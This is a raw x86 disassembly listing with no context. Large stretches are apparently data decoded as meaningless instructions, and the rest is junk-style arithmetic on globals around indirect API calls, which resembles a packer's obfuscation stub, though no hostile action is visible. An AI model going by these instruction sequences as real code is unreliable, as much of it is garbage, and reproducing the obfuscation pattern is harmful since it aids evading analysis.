  41c136:	add    esi,DWORD PTR [eax-0x2b]
  41c139:	(bad)  
  41c13a:	dec    eax
  41c13b:	xchg   edx,eax
  41c13c:	sub    eax,0x2a7179ef
  41c141:	and    DWORD PTR [eax],ecx
  41c143:	mov    dh,0xa1
  41c145:	mov    eax,ds:0xdac3d818
  41c14a:	scas   eax,DWORD PTR es:[edi]
  41c14b:	xchg   esp,eax
  41c14c:	mov    esi,0x2940c9b5
  41c151:	retf   
  41c152:	(bad)  
  41c153:	std    
  41c154:	adc    ebp,DWORD PTR [esi+edi*1+0x1f]
  41c158:	jle    0x41c18f
  41c15a:	inc    ebx
  41c15b:	loopne 0x41c1a6
  41c15d:	ds sbb eax,0x98ca2399
  41c163:	cld    
  41c164:	fst    st(1)
  41c166:	adc    al,0x96
  41c168:	cld    
  41c169:	add    BYTE PTR [eax+0x79b8e7de],0xe0
  41c170:	mov    ah,0xc6
  41c172:	inc    edx
  41c173:	retf   
  41c174:	jmp    0x41c1d0
  41c176:	pusha  
  41c177:	jmp    0x3446830d
  41c17c:	call   0x3929:0xea4d905b
  41c183:	in     eax,dx
  41c184:	gs in  eax,dx
  41c186:	xchg   edi,eax
  41c187:	pop    esp
  41c188:	cdq    
  41c189:	and    BYTE PTR [esi+ebp*8],cl
  41c18c:	sbb    eax,0x9260c89e
  41c191:	inc    ebp
  41c192:	jl     0x41c196
  41c194:	mov    ebx,0xf2d75fcb
  41c199:	dec    ebp
  41c19a:	scas   eax,DWORD PTR es:[edi]
  41c19b:	pop    edi
  41c19c:	xchg   esp,eax
  41c19d:	xor    al,0x1d
  41c19f:	and    BYTE PTR [esi-0x740b1faf],dh
  41c1a5:	shr    BYTE PTR [eax+0x4b],cl
  41c1a8:	cwde   
  41c1a9:	fs into 
  41c1ab:	popf   
  41c1ac:	nop
  41c1ad:	repnz shr BYTE PTR [edi+0x476433f3],0xc9
  41c1b5:	jl     0x41c200
  41c1b7:	dec    edx
  41c1b8:	repz fwait
  41c1ba:	idiv   DWORD PTR [eax+ebx*2-0x6558c2f2]
  41c1c1:	mov    ebx,0xaeca2f0c
  41c1c6:	or     BYTE PTR [ebp-0x3c],ah
  41c1c9:	xchg   edx,eax
  41c1ca:	cld    
  41c1cb:	xor    al,0xac
  41c1cd:	lahf   
  41c1ce:	xchg   edi,ecx
  41c1d0:	cwde   
  41c1d1:	cmp    eax,0x8c612510
  41c1d6:	push   esp
  41c1d7:	cmp    bh,BYTE PTR [esp+eax*8]
  41c1da:	xor    BYTE PTR [edx+0x79],ah
  41c1dd:	jg     0x41c1bb
  41c1df:	add    dh,BYTE PTR [esi]
  41c1e1:	adc    eax,0xb4e3ab37
  41c1e6:	push   ds
  41c1e7:	iret   
  41c1e8:	add    ch,BYTE PTR [ebx]
  41c1ea:	mov    ebx,0x6a5ec1be
  41c1ef:	ret    0x7a51
  41c1f2:	sbb    ch,bl
  41c1f4:	lock aam 0xc5
  41c1f7:	in     al,dx
  41c1f8:	retf   0x4aed
  41c1fb:	sub    eax,0xa480f5cf
  41c200:	add    al,0xee
  41c202:	(bad)  
  41c203:	jecxz  0x41c1fa
  41c205:	sub    eax,edx
  41c207:	add    eax,0xa8408ecc
  41c20c:	jae    0x41c28a
  41c20e:	dec    eax
  41c20f:	and    al,0xf9
  41c211:	cld    
  41c212:	inc    ecx
  41c213:	dec    ecx
  41c214:	mov    eax,ds:0x82a4a36a
  41c219:	add    edx,DWORD PTR [eax-0x381bbcf6]
  41c21f:	in     al,0x4
  41c221:	push   eax
  41c222:	fst    QWORD PTR [edi]
  41c224:	repz jl 0x41c1b6
  41c227:	aam    0xf3
  41c229:	jmp    0xc4278660
  41c22e:	in     al,dx
  41c22f:	cwde   
  41c230:	aas    
  41c231:	mov    eax,0xb5a50df7
  41c236:	out    dx,eax
  41c237:	lahf   
  41c238:	add    BYTE PTR [esi],ah
  41c23a:	out    dx,al
  41c23b:	pop    ecx
  41c23c:	cmp    al,0x93
  41c23e:	loop   0x41c250
  41c240:	in     eax,dx
  41c241:	dec    edx
  41c242:	sbb    al,0x4e
  41c244:	out    dx,al
  41c245:	retf   
  41c246:	pop    ebx
  41c247:	sbb    eax,0x351a296e
  41c24c:	push   ebp
  41c24d:	in     eax,dx
  41c24e:	call   0x693c:0x993a308b
  41c255:	mov    BYTE PTR [eax-0x50c56b31],bh
  41c25b:	jbe    0x41c285
  41c25d:	sub    al,0x5a
  41c25f:	pushf  
  41c260:	xchg   DWORD PTR [edi+0x25031699],esi
  41c266:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c267:	xadd   BYTE PTR [edi+edx*1-0x3a],bl
  41c26c:	push   esi
  41c26d:	jne    0x41c2dc
  41c26f:	add    ebx,DWORD PTR [edi+0x7]
  41c272:	xchg   edx,eax
  41c273:	adc    DWORD PTR [edi*2-0x7cdc59eb],esp
  41c27a:	nop
  41c27b:	mov    ecx,0x1f6c7e0a
  41c280:	sbb    al,0x8e
  41c282:	shl    DWORD PTR [ecx-0x2b7f40b7],cl
  41c288:	and    edi,esp
  41c28a:	outs   dx,BYTE PTR ds:[esi]
  41c28b:	mov    dl,0xf7
  41c28d:	jne    0x41c2c7
  41c28f:	clc    
  41c290:	hlt    
  41c291:	mov    al,ds:0x6db41946
  41c296:	push   ecx
  41c297:	loope  0x41c29c
  41c299:	pop    esi
  41c29a:	out    dx,al
  41c29b:	mov    bl,0x82
  41c29d:	xchg   edx,eax
  41c29e:	xor    DWORD PTR [esi],edx
  41c2a0:	enter  0x4767,0xdc
  41c2a4:	inc    esp
  41c2a5:	dec    ecx
  41c2a6:	loope  0x41c267
  41c2a8:	push   esi
  41c2a9:	ds imul dl
  41c2ac:	ror    DWORD PTR [esi-0x2bcaee7e],cl
  41c2b2:	add    al,BYTE PTR [eax-0x20]
  41c2b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2b6:	int    0x24
  41c2b8:	ss ins DWORD PTR es:[edi],dx
  41c2ba:	mov    ebx,0x71981587
  41c2bf:	dec    edi
  41c2c0:	inc    esp
  41c2c1:	inc    edi
  41c2c2:	pushf  
  41c2c3:	xor    DWORD PTR [ecx+0x1ff52250],0xffffffee
  41c2ca:	into   
  41c2cb:	jmp    0x8f31f163
  41c2d0:	out    0xae,al
  41c2d2:	mov    WORD PTR [edi-0x7e7b50cb],fs
  41c2d8:	in     al,dx
  41c2d9:	imul   edi,edx,0x1f
  41c2dc:	inc    esp
  41c2dd:	jecxz  0x41c2de
  41c2df:	jle    0x41c306
  41c2e1:	sbb    DWORD PTR [ecx-0x1b],edx
  41c2e4:	sub    al,0x17
  41c2e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2e7:	pop    eax
  41c2e8:	xor    BYTE PTR [ebx+0x74667a92],cl
  41c2ee:	ja     0x41c351
  41c2f0:	mov    ecx,0x4607a02b
  41c2f5:	push   esi
  41c2f6:	and    bl,cl
  41c2f8:	and    DWORD PTR es:[ebp+0x2495a5bd],esi
  41c2ff:	gs push 0x6d14ccbf
  41c305:	or     DWORD PTR [edi-0x66],esi
  41c308:	jmp    FWORD PTR [ebp-0x32c671ae]
  41c30e:	add    DWORD PTR [edi],edx
  41c310:	sti    
  41c311:	or     eax,0xa53df49e
  41c316:	es sub esi,ebx
  41c319:	mov    WORD PTR [ebx],gs
  41c31b:	xor    eax,0x5e8c
  41c320:	mov    DWORD PTR [ebp-0x48],eax
  41c323:	sbb    DWORD PTR ds:0x428485,edi
  41c329:	mov    DWORD PTR [ebp-0x13c],0x7b18
  41c333:	mov    DWORD PTR [ebp-0x138],0x1169
  41c33d:	mov    DWORD PTR [ebp-0x12c],0x1379
  41c347:	sbb    DWORD PTR ds:0x4284f5,ecx
  41c34d:	mov    eax,DWORD PTR [ebp-0x12c]
  41c353:	adc    DWORD PTR ds:0x428469,0x44e5
  41c35d:	mov    ecx,0x5856
  41c362:	sub    ecx,eax
  41c364:	and    DWORD PTR ds:0x4283c5,ecx
  41c36a:	shr    ecx,0x2
  41c36d:	cmp    DWORD PTR ds:0x42850d,0x0
  41c374:	mov    DWORD PTR ds:0x4283b9,0x1c8e
  41c37e:	mov    DWORD PTR ds:0x428499,0x3a72
  41c388:	mov    DWORD PTR ds:0x4282dd,0x2994
  41c392:	jmp    0x41c475
  41c397:	mov    eax,ds:0x42847d
  41c39c:	cmp    DWORD PTR ds:0x42850d,0x0
  41c3a3:	jge    0x41c3d2
  41c3a9:	push   DWORD PTR [ebp-0x20]
  41c3ac:	push   DWORD PTR [ebp-0x24]
  41c3af:	push   DWORD PTR [ebp-0x1c]
  41c3b2:	call   DWORD PTR ds:0x42e120
  41c3b8:	and    DWORD PTR ds:0x4283a9,edx
  41c3be:	sub    DWORD PTR ds:0x428309,0x53c2
  41c3c8:	and    DWORD PTR ds:0x42830d,0x428519
  41c3d2:	or     DWORD PTR ds:0x4284e9,edi
  41c3d8:	sbb    DWORD PTR ds:0x428305,0x4284f5
  41c3e2:	cmp    DWORD PTR ds:0x428411,0x0
  41c3e9:	mov    DWORD PTR ds:0x4283e1,0x3b49
  41c3f3:	mov    DWORD PTR ds:0x4283f1,0x7933
  41c3fd:	mov    DWORD PTR ds:0x428405,0x897
  41c407:	mov    DWORD PTR ds:0x4282f9,0x5a92
  41c411:	jmp    0x41c475
  41c416:	mov    eax,0x55e0
  41c41b:	movzx  eax,WORD PTR ds:0x42846d
  41c422:	cmp    DWORD PTR ds:0x428411,0x0
  41c429:	ja     0x41c45f
  41c42f:	push   DWORD PTR [ebp-0x18]
  41c432:	push   DWORD PTR [ebp-0x18]
  41c435:	push   DWORD PTR [ebp-0x18]
  41c438:	push   DWORD PTR [ebp-0x20]
  41c43b:	push   0x8c53
  41c440:	push   DWORD PTR [ebp-0x14]
  41c443:	call   DWORD PTR ds:0x42e068
  41c449:	add    DWORD PTR ds:0x4283a5,ecx
  41c44f:	not    DWORD PTR ds:0x428479
  41c455:	adc    DWORD PTR ds:0x4283e9,0x2c56
  41c45f:	add    DWORD PTR ds:0x428495,0x4283cd
  41c469:	add    DWORD PTR ds:0x4283ad,edi
  41c46f:	sub    DWORD PTR ds:0x42841d,edx
  41c475:	sub    ecx,0x5be6
  41c47b:	mov    eax,DWORD PTR [ebp-0x138]
  41c481:	xor    DWORD PTR ds:0x4283d5,0x2de
  41c48b:	imul   ecx,eax
  41c48e:	mov    eax,ds:0x428405
  41c493:	add    DWORD PTR ds:0x42851d,eax
  41c499:	mov    eax,DWORD PTR [ebp-0x13c]
  41c49f:	and    ecx,eax
  41c4a1:	cmp    DWORD PTR ds:0x428519,0x0
  41c4a8:	mov    DWORD PTR ds:0x4283fd,0x420b
  41c4b2:	mov    DWORD PTR ds:0x428479,0x3ab4
  41c4bc:	mov    DWORD PTR ds:0x428419,0x3618
  41c4c6:	jmp    0x41c90c
  41c4cb:	mov    DWORD PTR ds:0x4283b9,0xf37
  41c4d5:	not    eax
  41c4d7:	cmp    DWORD PTR ds:0x428519,0x0
  41c4de:	jg     0x41c505
  41c4e4:	push   0x2612
  41c4e9:	push   DWORD PTR [ebp-0x1c]
  41c4ec:	push   DWORD PTR [ebp-0x14]
  41c4ef:	call   DWORD PTR ds:0x42e06c
  41c4f5:	and    DWORD PTR ds:0x4283f9,0x428489
  41c4ff:	add    DWORD PTR ds:0x4282ed,edi
  41c505:	xor    DWORD PTR ds:0x4283bd,edx
  41c50b:	sbb    DWORD PTR ds:0x428405,0x4283f5
  41c515:	mov    DWORD PTR ds:0x428419,0x491d
  41c51f:	add    DWORD PTR ds:0x4282f1,ebx
  41c525:	jmp    0x41c90c
  41c52a:	sub    ch,BYTE PTR [esi-0x62]
  41c52d:	sbb    DWORD PTR [edx-0x7c9145e7],edi
  41c533:	pop    ebp
  41c534:	and    al,0x9e
  41c536:	jp     0x41c55e
  41c538:	jmp    0xc0832620
  41c53d:	mov    esi,0xbebec44a
  41c542:	push   bp
  41c544:	jne    0x41c4da
  41c546:	pop    ecx
  41c547:	int3   
  41c548:	rcr    DWORD PTR [ecx-0x4b],1
  41c54b:	add    esi,DWORD PTR [esi-0x3c]
  41c54e:	mov    ecx,DWORD PTR [ecx+0x69ade2cb]
  41c554:	or     bl,cl
  41c556:	mov    ah,0x32
  41c558:	xchg   ecx,eax
  41c559:	mov    al,ds:0x84bca9a1
  41c55e:	or     edx,DWORD PTR [edi-0xe674707]
  41c564:	test   ebx,ecx
  41c566:	fild   DWORD PTR [esi+0x69e8d851]
  41c56c:	mov    gs,WORD PTR [edx+0xbaf4590]
  41c572:	cmp    esi,DWORD PTR [ebp+0x6e]
  41c575:	pop    eax
  41c576:	xchg   edx,eax
  41c577:	in     eax,0x68
  41c579:	ficom  WORD PTR [ebx+0x5c]
  41c57c:	xchg   esp,eax
  41c57d:	(bad)  
  41c57e:	push   ecx
  41c57f:	gs adc al,0x98
  41c582:	pop    esp
  41c583:	jns    0x41c5ac
  41c585:	lahf   
  41c586:	popa   
  41c587:	loop   0x41c52d
  41c589:	mov    edi,0x470fe293
  41c58e:	mov    ecx,0x70972027
  41c593:	inc    ebp
  41c594:	shr    DWORD PTR [edi],0x27
  41c597:	int3   
  41c598:	mov    cl,0xb6
  41c59a:	jmp    0xcd87:0x83312551
  41c5a1:	xchg   ecx,eax
  41c5a2:	jle    0x41c549
  41c5a4:	jl     0x41c54b
  41c5a6:	sbb    eax,0x99b8abb0
  41c5ab:	sub    al,0xd2
  41c5ad:	les    edx,FWORD PTR [edi]
  41c5af:	xchg   edi,edx
  41c5b1:	or     BYTE PTR [ecx-0x26],0x76
  41c5b5:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5b7:	fwait
  41c5b8:	xchg   esi,eax
  41c5b9:	push   ebp
  41c5ba:	pop    esi
  41c5bb:	mov    esp,0x56de93fb
  41c5c0:	dec    esp
  41c5c1:	pop    es
  41c5c2:	(bad)  
  41c5c4:	xor    dh,dh
  41c5c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5c7:	sar    BYTE PTR [edx+esi*2-0x40],cl
  41c5cb:	jge    0x41c637
  41c5cd:	leave  
  41c5ce:	outs   dx,DWORD PTR ds:[esi]
  41c5cf:	sbb    ch,BYTE PTR [ecx]
  41c5d1:	inc    esi
  41c5d2:	mov    esi,0xfd8b6024
  41c5d7:	mov    ds:0x4ceabef6,eax
  41c5dc:	dec    ebx
  41c5dd:	ins    DWORD PTR es:[edi],dx
  41c5de:	ja     0x41c613
  41c5e0:	sub    eax,0x2a781bcf
  41c5e5:	test   DWORD PTR [esi-0x1c72d46b],esp
  41c5eb:	es lahf 
  41c5ed:	loopne 0x41c593
  41c5ef:	dec    edi
  41c5f0:	repz mov eax,0x7f14860e
  41c5f6:	cli    
  41c5f7:	loop   0x41c5b7
  41c5f9:	test   ch,ch
  41c5fb:	gs push edi
  41c5fd:	jmp    0x165f230a
  41c602:	popa   
  41c603:	sbb    eax,0x49c24e35
  41c608:	imul   esp,DWORD PTR [eax+0x52],0x7baf5d5d
  41c60f:	out    0xca,eax
  41c611:	pop    ebx
  41c612:	popf   
  41c613:	shl    DWORD PTR [di+0x1568],0xae
  41c619:	cmp    ch,BYTE PTR [eax+0x7102e64a]
  41c61f:	lods   al,BYTE PTR ds:[esi]
  41c620:	ins    DWORD PTR es:[edi],dx
  41c621:	xchg   esp,eax
  41c622:	add    al,0x56
  41c624:	outs   dx,DWORD PTR ds:[esi]
  41c625:	cmc    
  41c626:	ja     0x41c685
  41c628:	ja     0x41c5fc
  41c62a:	test   edx,edi
  41c62c:	outs   dx,BYTE PTR ds:[esi]
  41c62d:	jg     0x41c5b2
  41c62f:	adc    BYTE PTR [edx],cl
  41c631:	or     ah,bl
  41c633:	out    dx,eax
  41c634:	xor    bh,ah
  41c636:	lods   al,BYTE PTR ds:[esi]
  41c637:	cld    
  41c638:	xlat   BYTE PTR ds:[ebx]
  41c639:	jg     0x41c67b
  41c63b:	pop    ss
  41c63c:	imul   edx,DWORD PTR [edi+ebx*2-0x48549d5c],0x27
  41c644:	(bad)  
  41c645:	ret    
  41c646:	stos   BYTE PTR es:[edi],al
  41c647:	sub    BYTE PTR [esi],dh
  41c649:	cld    
  41c64a:	sub    eax,0x8a9134dc
  41c64f:	ds jmp 0xe656:0xf912990d
  41c657:	inc    eax
  41c658:	int3   
  41c659:	int3   
  41c65a:	addr16 inc esp
  41c65c:	mov    bh,0x8a
  41c65e:	mov    cl,0x47
  41c660:	sbb    al,BYTE PTR es:[edx]
  41c663:	call   0xc042:0xa56ea80e
  41c66a:	and    ebx,DWORD PTR [ecx]
  41c66c:	dec    esp
  41c66d:	sbb    eax,0xe410be02
  41c672:	(bad)  
  41c673:	mov    BYTE PTR [eax-0x75],dh
  41c676:	pop    edx
  41c677:	adc    edi,ebx
  41c679:	jnp    0x41c683
  41c67b:	xor    BYTE PTR [eax],dl
  41c67d:	repnz aas 
  41c67f:	dec    ebx
  41c680:	addr16 xchg esi,eax
  41c682:	mov    cl,0xa0
  41c684:	lods   eax,DWORD PTR ds:[esi]
  41c685:	xchg   edi,eax
  41c686:	imul   ebp,DWORD PTR [eax+0x65077b7f],0x4b00d602
  41c690:	lahf   
  41c691:	xor    ecx,ebp
  41c693:	or     eax,0xfaf383a0
  41c698:	imul   ebp,DWORD PTR [ebp-0x48],0xc3905945
  41c69f:	cmp    edx,DWORD PTR [ecx]
  41c6a1:	aam    0x88
  41c6a3:	jno    0x41c6ea
  41c6a5:	mov    ebp,0x5a704eae
  41c6aa:	or     edx,esp
  41c6ac:	xchg   ecx,eax
  41c6ad:	stc    
  41c6ae:	jmp    0x4f08:0x41fd5303
  41c6b5:	int3   
  41c6b6:	es adc eax,ebp
  41c6b9:	not    BYTE PTR [edi+0x1e]
  41c6bc:	aad    0xff
  41c6be:	repz sbb ecx,DWORD PTR [edx+0x6fec778d]
  41c6c5:	(bad)  
  41c6c6:	fistp  DWORD PTR [edx+0x4]
  41c6c9:	mov    eax,DWORD PTR [ebx]
  41c6cb:	daa    
  41c6cc:	icebp  
  41c6cd:	daa    
  41c6ce:	stos   BYTE PTR es:[edi],al
  41c6cf:	cdq    
  41c6d0:	pop    esp
  41c6d1:	xlat   BYTE PTR ds:[ebx]
  41c6d2:	dec    edx
  41c6d3:	sub    DWORD PTR [ebx+ecx*1-0x8],ecx
  41c6d7:	not    BYTE PTR [ebx+eiz*4+0x427a36d4]
  41c6de:	add    al,BYTE PTR [edx+0x3b950286]
  41c6e4:	sti    
  41c6e5:	aam    0x6d
  41c6e7:	sub    edi,DWORD PTR [edi-0x4010febb]
  41c6ed:	jmp    0x41c6ac
  41c6ef:	and    ebp,DWORD PTR [edx+0x41]
  41c6f2:	aad    0xf2
  41c6f4:	push   esi
  41c6f5:	sub    esp,DWORD PTR [edi+0x3]
  41c6f8:	dec    ecx
  41c6f9:	test   esp,edx
  41c6fb:	sub    DWORD PTR [ebx],ebp
  41c6fd:	dec    ecx
  41c6fe:	and    BYTE PTR [ebx-0xc],al
  41c701:	mov    al,ds:0x7d23d0b3
  41c706:	sub    BYTE PTR [ebp-0x1bfa28a1],0x69
  41c70d:	jp     0x41c6ed
  41c70f:	arpl   WORD PTR [ecx+0x3474564d],bp
  41c715:	jge    0x41c6a2
  41c717:	mov    bh,0x91
  41c719:	adc    BYTE PTR [ebx+0x6e822f5e],dl
  41c71f:	(bad)  
  41c720:	out    dx,al
  41c721:	lea    ecx,[edi+ecx*2+0x48]
  41c725:	add    al,0x72
  41c727:	scas   eax,DWORD PTR es:[edi]
  41c728:	out    dx,al
  41c729:	lds    ecx,FWORD PTR [edx]
  41c72b:	(bad)  
  41c72c:	xor    BYTE PTR ds:0x22d6ace5,dl
  41c732:	sti    
  41c733:	xchg   esp,eax
  41c734:	in     eax,dx
  41c735:	push   ebp
  41c736:	dec    ebp
  41c737:	aas    
  41c738:	jmp    0x908247e2
  41c73d:	loopne 0x41c6ed
  41c73f:	mov    ebx,0xd4f3b58
  41c744:	in     al,0x2c
  41c746:	xchg   edi,eax
  41c747:	lea    edi,[ecx]
  41c749:	das    
  41c74a:	xlat   BYTE PTR ds:[ebx]
  41c74b:	cmp    esp,DWORD PTR [ecx]
  41c74d:	xchg   esp,eax
  41c74e:	mov    ah,0x2b
  41c750:	stc    
  41c751:	aad    0x3a
  41c753:	imul   esp,DWORD PTR [edi-0x60e6f75c],0xef231d63
  41c75d:	pop    esp
  41c75e:	das    
  41c75f:	or     eax,0x46e630cf
  41c764:	in     eax,0x13
  41c766:	adc    al,BYTE PTR [eax]
  41c768:	enter  0xf7ed,0xc2
  41c76c:	mov    cl,0xeb
  41c76e:	aam    0x21
  41c770:	xchg   ebp,eax
  41c771:	xchg   ebx,eax
  41c772:	and    BYTE PTR [ecx-0x6],0x42
  41c776:	in     al,0xf
  41c778:	cmp    bl,dh
  41c77a:	(bad)  
  41c77b:	adc    al,0xd
  41c77d:	adc    eax,0xa1017f73
  41c782:	aaa    
  41c783:	(bad)  
  41c785:	jbe    0x41c77f
  41c787:	cld    
  41c788:	jmp    0x74f189cb
  41c78d:	push   ds
  41c78e:	jmp    0xbe28985
  41c793:	or     DWORD PTR cs:[ebx+0xbcfec73],esi
  41c79a:	(bad)
  41c79d:	mov    ss,WORD PTR ds:0xb0126d6d
  41c7a3:	hlt    
  41c7a4:	and    eax,0x61647733
  41c7a9:	pop    edx
  41c7aa:	fldenv [ecx+0x42f09e7]
  41c7b0:	mov    ds:0x905a893f,al
  41c7b5:	jno    0x41c785
  41c7b7:	pop    edx
  41c7b8:	dec    ebp
  41c7b9:	fwait
  41c7ba:	mov    cl,BYTE PTR [esi+0x1d]
  41c7bd:	mov    gs,WORD PTR [esi+0x77]
  41c7c0:	aad    0xcd
  41c7c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7c3:	pop    eax
  41c7c4:	stos   BYTE PTR es:[edi],al
  41c7c5:	popf   
  41c7c6:	cld    
  41c7c7:	dec    ecx
  41c7c8:	jle    0x41c7d5
  41c7ca:	add    bh,BYTE PTR [edx-0x43]
  41c7cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7ce:	xchg   esp,eax
  41c7cf:	sbb    eax,0xb5a4a2f8
  41c7d4:	inc    edi
  41c7d5:	push   cs
  41c7d6:	retf   0x8a57
  41c7d9:	(bad)  
  41c7da:	daa    
  41c7db:	or     DWORD PTR [ebx],edx
  41c7dd:	mov    ecx,0x5253fb7f
  41c7e2:	add    eax,0xd6cfa22a
  41c7e7:	cmp    ebp,DWORD PTR [ebx-0x1]
  41c7ea:	push   0x1b
  41c7ec:	fcompp 
  41c7ee:	enter  0x4ba,0xd2
  41c7f2:	lock mov ds:0x37ec4567,eax
  41c7f8:	cli    
  41c7f9:	in     eax,dx
  41c7fa:	and    DWORD PTR [ebx+0x27baa238],esp
  41c800:	dec    ebx
  41c801:	jl     0x41c7ba
  41c803:	dec    eax
  41c804:	fisub  WORD PTR [ebx+edx*2]
  41c807:	ret    0x8756
  41c80a:	dec    ebx
  41c80b:	mov    dl,BYTE PTR [edx-0x26ec08a3]
  41c811:	ins    BYTE PTR es:[edi],dx
  41c812:	and    DWORD PTR [esi],0x84813ac5
  41c818:	sbb    BYTE PTR [edx],ah
  41c81a:	xor    DWORD PTR [ecx-0x4e],edx
  41c81d:	ror    DWORD PTR [esi],1
  41c81f:	push   ebx
  41c820:	xchg   DWORD PTR [bp+si+0x8],esp
  41c824:	fidivr DWORD PTR [edi]
  41c826:	out    dx,eax
  41c827:	mov    fs,WORD PTR [eax+0x6f6ba222]
  41c82d:	pop    ebx
  41c82f:	ss fmulp st(1),st
  41c832:	xor    DWORD PTR [ebp+0x6c8d3985],ebx
  41c838:	cmp    bl,BYTE PTR [esi+0x4c]
  41c83b:	retf   
  41c83c:	aam    0x14
  41c83e:	int3   
  41c83f:	push   edi
  41c840:	fwait
  41c841:	jae    0x41c847
  41c843:	dec    eax
  41c844:	adc    eax,0xea03b5c4
  41c849:	push   edx
  41c84a:	xor    al,0x95
  41c84c:	sub    ah,dl
  41c84e:	js     0x41c8b6
  41c850:	call   0x2817e975
  41c855:	fmul   QWORD PTR [edi]
  41c857:	mov    ds:0x2fcdecd6,al
  41c85c:	adc    DWORD PTR [ecx-0x9],esp
  41c85f:	retf   
  41c860:	ss sahf 
  41c862:	pop    esp
  41c863:	mov    ds:0x61a0b216,al
  41c868:	jns    0x41c870
  41c86a:	push   esp
  41c86b:	test   ecx,edi
  41c86d:	out    dx,eax
  41c86e:	add    al,0x8
  41c870:	inc    esi
  41c871:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c872:	mov    ecx,0x92554230
  41c877:	add    ch,ch
  41c879:	jp     0x41c826
  41c87b:	jle    0x41c862
  41c87d:	sbb    al,0x38
  41c87f:	daa    
  41c880:	jb     0x41c8bb
  41c882:	jecxz  0x41c8ac
  41c884:	inc    ebp
  41c885:	sbb    dh,BYTE PTR [edi-0x54]
  41c888:	loope  0x41c8a7
  41c88a:	mov    BYTE PTR [eax-0x3f6c391c],cl
  41c890:	ds (bad) 
  41c892:	pushf  
  41c893:	push   esi
  41c894:	xor    DWORD PTR [esp+ebp*8+0x452ecbea],ecx
  41c89b:	lea    edi,[edx+ebp*8-0x4f]
  41c89f:	and    eax,edi
  41c8a1:	and    DWORD PTR [eax+ebx*8],0x1f
  41c8a5:	cli    
  41c8a6:	(bad)
  41c8aa:	aas    
  41c8ab:	not    BYTE PTR [edx+0x68cd82d6]
  41c8b1:	or     eax,0x158cb3ca
  41c8b6:	clc    
  41c8b7:	lods   al,BYTE PTR ds:[esi]
  41c8b8:	fcom   st(2)
  41c8ba:	fild   DWORD PTR [ebx]
  41c8bc:	ret    
  41c8bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c8be:	fld    TBYTE PTR [eax-0x1317e5e9]
  41c8c4:	and    eax,0x4d161d9b
  41c8c9:	jge    0x41c934
  41c8cb:	es mov esp,edx
  41c8ce:	mov    al,ds:0x83e52603
  41c8d3:	aaa    
  41c8d4:	sbb    DWORD PTR [ebx+0x876951e],edi
  41c8da:	xchg   edx,eax
  41c8db:	pop    esi
  41c8dc:	imul   edi,eax,0x1e
  41c8df:	jl     0x41c8a1
  41c8e1:	addr16 push edx
  41c8e3:	sub    BYTE PTR [ebx],0x5f
  41c8e6:	mov    DWORD PTR [ecx+0x3],eax
  41c8e9:	push   es
  41c8ea:	sbb    DWORD PTR [ebp+eiz*8+0x4],ebp
  41c8ee:	cld    
  41c8ef:	cmp    DWORD PTR [ecx-0x4f6b2ede],ecx
  41c8f5:	inc    esp
  41c8f6:	adc    DWORD PTR [esi],ecx
  41c8f8:	fld    TBYTE PTR [ebx+edx*1+0x5124aae]
  41c8ff:	xor    dl,BYTE PTR [ebx+0x7b482c19]
  41c905:	inc    edi
  41c906:	jge    0x41c892
  41c908:	mov    edi,0xb8577d65
  41c90d:	sbb    BYTE PTR [ebx],bh
  41c90f:	add    BYTE PTR [eax],al
  41c911:	or     DWORD PTR ds:0x42851d,0x4283b5
  41c91b:	sub    eax,ecx
  41c91d:	mov    ecx,DWORD PTR ds:0x42841d
  41c923:	sbb    ecx,DWORD PTR ds:0x428479
  41c929:	mov    DWORD PTR ds:0x42841d,ecx
  41c92f:	mov    DWORD PTR [ebp-0xfc],eax
  41c935:	movzx  eax,BYTE PTR ds:0x4282f9
  41c93c:	sub    eax,DWORD PTR ds:0x4282d9
  41c942:	mov    ds:0x4282f9,eax
  41c947:	mov    DWORD PTR [ebp-0x28],0x16d7
  41c94e:	mov    DWORD PTR [ebp-0x134],0x6b4
  41c958:	mov    eax,DWORD PTR [ebp-0x134]
  41c95e:	cmp    DWORD PTR ds:0x42851d,0x0
  41c965:	mov    ecx,0x4723
  41c96a:	mov    DWORD PTR ds:0x4282e1,0x48a0
  41c974:	jmp    0x41c9c9
  41c979:	mov    ecx,0x5cee
  41c97e:	cmp    DWORD PTR ds:0x42851d,0x0
  41c985:	jl     0x41c9b9
  41c98b:	push   0x8e3c
  41c990:	call   DWORD PTR ds:0x42e070
  41c996:	movzx  ecx,BYTE PTR ds:0x42841d
  41c99d:	sbb    DWORD PTR ds:0x428409,ecx
  41c9a3:	xor    DWORD PTR ds:0x42850d,edx
  41c9a9:	mov    DWORD PTR ds:0x428481,0x54fa
  41c9b3:	adc    DWORD PTR ds:0x4283f5,ebx
  41c9b9:	xor    ecx,DWORD PTR ds:0x428505
  41c9bf:	sub    DWORD PTR ds:0x4283d1,0x73c7
  41c9c9:	or     eax,0x4f70
  41c9ce:	cmp    DWORD PTR ds:0x4283cd,0x0
  41c9d5:	mov    ecx,0x6758
  41c9da:	mov    ecx,0x329e
  41c9df:	mov    DWORD PTR ds:0x428465,ecx
  41c9e5:	mov    DWORD PTR ds:0x428409,edi
  41c9eb:	jmp    0x41ca37
  41c9f0:	mov    DWORD PTR ds:0x428305,0x5f4d
  41c9fa:	cmp    DWORD PTR ds:0x4283cd,0x0
  41ca01:	jae    0x41ca29
  41ca07:	push   0x67b2
  41ca0c:	push   0x4f13
  41ca11:	call   DWORD PTR ds:0x42e074
  41ca17:	add    ecx,0x3ae9
  41ca1d:	sub    ecx,DWORD PTR ds:0x4282f9
  41ca23:	xor    ecx,DWORD PTR ds:0x4283cd
  41ca29:	adc    DWORD PTR ds:0x4282cd,ecx
  41ca2f:	adc    ecx,DWORD PTR ds:0x4283cd
  41ca35:	not    ecx
  41ca37:	mov    ecx,DWORD PTR [ebp-0x28]
  41ca3a:	or     DWORD PTR ds:0x42841d,0x428401
  41ca44:	or     eax,ecx
  41ca46:	xor    ecx,ecx
  41ca48:	xor    ecx,DWORD PTR ds:0x428301
